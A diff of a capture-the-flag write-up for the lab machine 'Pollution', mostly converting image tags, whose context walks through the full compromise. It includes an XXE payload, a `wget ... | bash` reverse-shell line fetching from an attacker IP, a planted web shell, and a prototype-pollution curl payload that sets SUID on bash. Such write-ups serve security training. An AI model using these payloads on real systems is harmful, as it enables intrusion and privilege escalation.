@@ -51,15 +51,15 @@ PORT     STATE SERVICE VERSION
 
 Heading to the web service, it is a standard company website.
 
-<figure><img src="../../../.gitbook/assets/image (2810).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2810).png>)
 
 Howeverm clicking on some objects reveals the `[object Object]` tag, which is a string representation of a Javascript object data type. Playing around with the logins didn't reveal much to me. However, registering a test account and logging in revealed that there was an API somewhere, and that my username `test` was printed on screen.
 
-<figure><img src="../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(474).png>)
 
 There could be an API backend, but I wasn't able to find it using normal means. Looking at the assets, I could see that this used jQuery 2.1.0. Wasn't of much use however.
 
-<figure><img src="../../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(729).png>)
 
 ### Finding Subhosts
 
@@ -67,25 +67,25 @@ I knew that there was some hidden servers or something within the website, as th
 
 Regular fuzzing did not do much for me, but when I fuzzed the HTTP Host header using `wfuzz`, I was able to find some results.
 
-<figure><img src="../../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(769).png>)
 
 We can add both of these to the `/etc/hosts` file. The `developers` subdomain requires a password to enter.
 
-<figure><img src="../../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1021).png>)
 
 ### Forum
 
 This was a forum page for users to write stuff, and there was some threads and a user that was active.
 
-<figure><img src="../../../.gitbook/assets/image (3456).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3456).png>)
 
 Reading some of the posts, I saw that there was indeed a Pollution API somewhere.
 
-<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(173).png>)
 
 I created a test user to download that file. The file contained a load of base64 encoded requests and stuff. Reading the requests, we can see that there was one to the /admin panel on the main website.
 
-<figure><img src="../../../.gitbook/assets/image (1333).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1333).png>)
 
 Decoding the request, we find that it gives us a token.
 
@@ -107,7 +107,7 @@ token=ddac62a28254561001277727cb397baf
 
 By replacing the PHPSESSID with our own created user, we can become an administrator by sending the same POST request to the website.
 
-<figure><img src="../../../.gitbook/assets/image (2837).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2837).png>)
 
 From here, we can register our own user and gain access to the API stuff.
 
@@ -147,7 +147,7 @@ After some trial and error, I found that using the `php://filter/` method worked
 %exfiltrate;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3507).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3507).png>)
 
 Payload used:
 
@@ -157,31 +157,31 @@ manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe S
 
 From here, I wanted to read the `/var/www/developers/.htpasswd` file since we found a password on it earlier.
 
-<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(305).png>)
 
 Using `john`, we could crack the hash to give `r0cket` as the password. We were confronted with another login page.
 
-<figure><img src="../../../.gitbook/assets/image (4039).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4039).png>)
 
 This time, we need to find credentials elsewhere. That `redis` instance is likely where this password is hidden. We cannot read the `/etc/redis` file without root permissions, so there likely is another file located somewhere.
 
 I tried checking for `config.php` files but was unable to find any. I knew that we had to go 'up' one directory because the current directory contained nothing, Some googling about Redis led me to the `bootstrp.php` file, which worked. It was located at `../bootstrp.php`.
 
-<figure><img src="../../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1026).png>)
 
 ### Redis
 
 We can login via `redis-cli` wth credentials.
 
-<figure><img src="../../../.gitbook/assets/image (1074).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1074).png>)
 
 Then, we can list the keys and other information within this database.
 
-<figure><img src="../../../.gitbook/assets/image (2743).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2743).png>)
 
 Seems that all of these keys are empty arrays, for some reason. I registered another user within the `collect.htb` website to see if we can do any other things.
 
-<figure><img src="../../../.gitbook/assets/image (3769).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3769).png>)
 
 So we have this, and we need a way to authenticate ourselves.  For this, we can set our role to `admin` and also set a `auth|s:1:\"a\"` bit, because this would grant us access to the `developers` endpoint.
 
@@ -191,7 +191,7 @@ We can use this command to do so:
 
 Then, replace the cookie and login to the `developers.collect.htb` endpoint.
 
-<figure><img src="../../../.gitbook/assets/image (2527).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2527).png>)
 
 ### RCE
 
@@ -207,19 +207,19 @@ This tool linked worked like a charm:
 
 This had some form of length barrier that was crashing the request. As such, we can use **PHP Shorthand Code,** which is basically a short form for PHP code. This involves the usage of the `<?=` tags. Then, since we have RCE, we can host the shell on my web server instead.
 
-<figure><img src="../../../.gitbook/assets/image (3622).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3622).png>)
 
 Testing this out, I used this command ``<?= `id` ?>.``
 
 This worked out pretty well as I was able to see the output here.
 
-<figure><img src="../../../.gitbook/assets/image (3584).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3584).png>)
 
 We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
 Now, we have a reverse shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (3823).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3823).png>)
 
 ## Privilege Escalation to Victor
 
@@ -229,17 +229,17 @@ Victor was the only user on this machine, and we needed to find his credentials 
 
 Within the `~/developers/login.php` file, I found some credentials.
 
-<figure><img src="../../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(385).png>)
 
 It appears there was a MySQL Instance on the machine running. We can login to that using `mysql -u webapp_user -p`.
 
 Then, we can enumerate this database.
 
-<figure><img src="../../../.gitbook/assets/image (3539).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3539).png>)
 
 We can find a hash from the `developers` database.
 
-<figure><img src="../../../.gitbook/assets/image (3776).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3776).png>)
 
 Couldn't crack the hash though.
 
@@ -247,17 +247,17 @@ Couldn't crack the hash though.
 
 For some persistance, I dropped a `cmd.php` shell into the `forum` website, so that I can establish RCE at any given time.
 
-<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(136).png>)
 
 ### PHP-FPM
 
 I ran `netstat -tulpn` to see what services were running on the machine, and found that port 9000 was listening to something.
 
-<figure><img src="../../../.gitbook/assets/image (1491).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1491).png>)
 
 I also ran LinPEAS to find some escalation vectors to victor. This user was also running the `php-fpm` master process or something.
 
-<figure><img src="../../../.gitbook/assets/image (2158).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2158).png>)
 
 Further enumeration reveals that port 9000 was FastCGI, and this was vulnerable to RCE. Since Victor is running it, this is our privilege escalation vector. We just need to make a script that would give us another reverse shell.
 
@@ -283,11 +283,11 @@ for FN in $FILENAMES; do
 done
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2362).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2362).png>)
 
 We can replace the command to get another reverse shell as needed.
 
-<figure><img src="../../../.gitbook/assets/image (1561).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1561).png>)
 
 From here, we can drop our public key into victor's .ssh folder to SSH in easily, and also grab the user flag.
 
@@ -295,7 +295,7 @@ From here, we can drop our public key into victor's .ssh folder to SSH in easily
 
 Within Victor's directory, there's a `pollution_api` folder. The `index.js` file specifies that there is this service running on port 3000.
 
-<figure><img src="../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(329).png>)
 
 Since this box was called pollution, I assumed that there was some Javascript pollution related exploit that would give us root. Within the `controllers` directory, there was this `Message_send.js` script.
 
@@ -349,13 +349,13 @@ First, we would need to get a valid token to interact with the API. Earlier, we 
 
 We can do this with the MySQL instance we accessed earlier.
 
-<figure><img src="../../../.gitbook/assets/image (3726).png" alt=""><figcaption><p>\</p></figcaption></figure>
+![\](<../../../.gitbook/assets/image%20(3726).png>)
 
-<figure><img src="../../../.gitbook/assets/image (1319).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1319).png>)
 
 Now we can login as this user using our credentials.
 
-<figure><img src="../../../.gitbook/assets/image (4029).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4029).png>)
 
 This would give us a token, which is needed for the `X-Access-Token` header. Reading the documentation for the API through accessing `http://127.0.0.1:3000/documentation`, we can see that we need to send a POST request to `/admin/mesages/send` to interact with the vulnerable function.
 
@@ -406,14 +406,12 @@ Now, we need to construct a paylaod that would pollute the `exec` function that 
 
 As such, we can construct this command:
 
-{% code overflow="wrap" %}
 ```bash
 curl http://127.0.0.1:3000/admin/messages/send -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDM5MjcyMiwiZXhwIjoxNjcwMzk2MzIyfQ.Ry9ngHgkESmKPTU624I_p7rPSAKAky-B6H_Ddzk1duw" -H "content-type: application/json" -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'
 ```
-{% endcode %}
 
 This would call a child\_process to execute `chmod +s /usr/bin/bash`.
 
-<figure><img src="../../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(766).png>)
 
 We are now root, and we can capture the root flag.
